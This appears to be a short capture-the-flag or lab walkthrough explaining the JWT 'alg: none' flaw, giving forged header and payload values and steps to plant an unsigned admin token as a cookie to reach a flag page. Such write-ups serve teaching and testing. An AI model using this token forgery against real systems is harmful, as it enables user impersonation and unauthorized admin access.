A JWT has 3 parts:

header.payload.signature


If the JWT header is manipulated to:
{
  "alg": "none",
  "typ": "JWT"
}

...and the backend blindly trusts the alg field and skips verifying the signature, you can pass unsigned tokens and impersonate any user.

Steps to Exploit Vulnerability

1.  Visit /jwt_none
2.  Copy the token
3.  Edit on jwt.io:

        Set header to: {"alg":"none","typ":"JWT"}

        Set payload: {"user":"guest","role":"admin"}

        Clear the signature completely

        Use only header.payload (no third part)

4.  Paste into browser via dev tools as cookie jwt_none

5.  Visit /jwt_admin_none ➜ 🎯 Flag if successful!